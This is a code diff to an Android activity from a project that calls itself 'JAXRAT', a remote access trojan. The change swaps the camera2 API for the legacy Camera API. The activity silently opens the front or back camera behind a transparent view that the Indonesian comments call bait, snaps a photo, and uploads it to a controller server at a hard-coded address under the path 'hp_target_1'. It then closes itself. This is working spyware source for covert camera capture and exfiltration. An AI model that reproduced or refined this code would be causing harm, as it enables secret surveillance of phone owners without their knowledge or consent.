@@ -2,126 +2,88 @@ package com.ezax.agent;
 
 import android.Manifest;
 import android.content.pm.PackageManager;
-import android.graphics.ImageFormat;
-import android.hardware.camera2.*;
-import android.media.Image;
-import android.media.ImageReader;
+import android.hardware.Camera;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.HandlerThread;
+import android.os.Looper;
 import android.util.Log;
-import android.view.Surface;
-import android.view.TextureView;
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
+import android.widget.FrameLayout;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.ByteBuffer;
 
 public class CameraActivity extends AppCompatActivity {
-    private CameraDevice cameraDevice;
-    private CameraCaptureSession captureSession;
-    private ImageReader imageReader;
-    private TextureView textureView;
-    private String cameraId;
-    private Handler backgroundHandler;
-    private HandlerThread backgroundThread;
+    private Camera camera;
+    private int cameraId = 0;
+    private boolean isFront = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Bikin TextureView transparan (bukan layout XML) biar sistem ngizinin kamera jalan
-        textureView = new TextureView(this);
-        setContentView(textureView);
+
+        // Bikin SurfaceView transparan buat pancingan biar kamera mau jalan
+        FrameLayout layout = new FrameLayout(this);
+        SurfaceView surfaceView = new SurfaceView(this);
+        layout.addView(surfaceView);
+        setContentView(layout);
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             finish(); return;
         }
 
-        boolean isFront = getIntent().getBooleanExtra("FRONT", false);
-        startBackgroundThread();
-        
-        textureView.setSurfaceTextureListener(new TextureView.SurfaceTextureListener() {
+        isFront = getIntent().getBooleanExtra("FRONT", false);
+
+        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
             @Override
-            public void onSurfaceTextureAvailable(android.graphics.SurfaceTexture surface, int width, int height) {
-                setupCamera(isFront);
+            public void surfaceCreated(SurfaceHolder holder) {
+                startCamera(holder);
             }
-            @Override public void onSurfaceTextureSizeChanged(android.graphics.SurfaceTexture surface, int width, int height) {}
-            @Override public boolean onSurfaceTextureDestroyed(android.graphics.SurfaceTexture surface) { return true; }
-            @Override public void onSurfaceTextureUpdated(android.graphics.SurfaceTexture surface) {}
+            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
+            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
         });
     }
 
-    private void setupCamera(boolean isFront) {
-        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+    private void startCamera(SurfaceHolder holder) {
         try {
-            for (String id : manager.getCameraIdList()) {
-                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
-                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
-                if (isFront && facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                    cameraId = id; break;
-                } else if (!isFront && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
-                    cameraId = id; break;
+            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+            int cameraCount = Camera.getNumberOfCameras();
+            
+            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
+                Camera.getCameraInfo(camIdx, cameraInfo);
+                if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    cameraId = camIdx;
+                    break;
+                } else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    cameraId = camIdx;
+                    break;
                 }
             }
-            
-            if (cameraId != null) {
-                imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
-                imageReader.setOnImageAvailableListener(reader -> {
-                    Image image = reader.acquireLatestImage();
-                    if (image != null) {
-                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                        byte[] bytes = new byte[buffer.remaining()];
-                        buffer.get(bytes);
-                        uploadImage(bytes);
-                        image.close();
-                    }
-                }, backgroundHandler);
 
-                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                        @Override
-                        public void onOpened(CameraDevice camera) {
-                            cameraDevice = camera;
-                            takePicture();
-                        }
-                        @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
-                        @Override public void onError(CameraDevice camera, int error) { camera.close(); finish(); }
-                    }, backgroundHandler);
-                }
-            } else { finish(); }
-        } catch (Exception e) { Log.e("JAXRAT", "Camera Error", e); finish(); }
-    }
+            camera = Camera.open(cameraId);
+            camera.setPreviewDisplay(holder);
+            camera.startPreview();
 
-    private void takePicture() {
-        try {
-            Surface surface = new Surface(textureView.getSurfaceTexture());
-            java.util.List<Surface> surfaces = java.util.Collections.singletonList(surface);
-            
-            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-            builder.addTarget(surface);
-            
-            cameraDevice.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
-                @Override
-                public void onConfigured(CameraCaptureSession session) {
-                    captureSession = session;
-                    try {
-                        CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                        captureBuilder.addTarget(imageReader.getSurface());
-                        session.capture(captureBuilder.build(), null, backgroundHandler);
-                    } catch (Exception e) { finish(); }
-                }
-                @Override public void onConfigureFailed(CameraCaptureSession session) { finish(); }
-            }, backgroundHandler);
-        } catch (Exception e) { finish(); }
+            // Jeda dikit biar autofokus nyesuaiin
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                camera.takePicture(null, null, (data, cam) -> {
+                    uploadImage(data);
+                });
+            }, 1000);
+
+        } catch (Exception e) {
+            Log.e("JAXRAT", "Kamera Error", e);
+            finish();
+        }
     }
 
     private void uploadImage(byte[] imageBytes) {
         new Thread(() -> {
             try {
-                // IP DISESUAIKAN DENGAN LAPTOP KAMU
+                // PASTIKAN IP INI SESUAI DENGAN LAPTOP KAMU SEKARANG
                 String serverUrl = "http://192.168.1.14:5000/api/upload_image/hp_target_1"; 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -141,21 +103,17 @@ public class CameraActivity extends AppCompatActivity {
                 Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
             } catch (Exception e) { Log.e("JAXRAT", "Upload Error", e); }
             
-            runOnUiThread(this::finish); 
+            runOnUiThread(this::finish);
         }).start();
-    }
-
-    private void startBackgroundThread() {
-        backgroundThread = new HandlerThread("CameraBackground");
-        backgroundThread.start();
-        backgroundHandler = new Handler(backgroundThread.getLooper());
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if (cameraDevice != null) cameraDevice.close();
-        if (imageReader != null) imageReader.close();
-        if (backgroundThread != null) backgroundThread.quitSafely();
+        if (camera != null) {
+            camera.stopPreview();
+            camera.release();
+            camera = null;
+        }
     }
 }
